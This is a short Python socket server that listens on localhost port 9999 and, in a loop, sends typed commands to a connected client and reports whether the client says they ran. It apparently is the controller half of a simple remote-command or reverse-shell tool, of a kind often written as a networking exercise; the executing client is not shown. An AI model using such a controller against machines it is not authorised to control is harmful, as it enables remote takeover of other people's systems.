import socket

server_add=('localhost',9999)

server=socket.socket()
server.bind(server_add)
server.listen()
print("Waiting for connection to be established")
client,client_add=server.accept()

print("Connection established with ",client,client_add)

while True:
    command=input("Enter a command: ")
    client.sendall(bytes(command.encode()))
    if command=="exit":
        client.sendall(bytes("exit".encode()))
        break

    isConfirm=client.recv(1000).decode()
    if isConfirm=="exit":
        break
    if isConfirm == "yes":
        print("[+] Command executed successfully.")
    else:
        print("[-] Command failed to execute!!!")

server.close()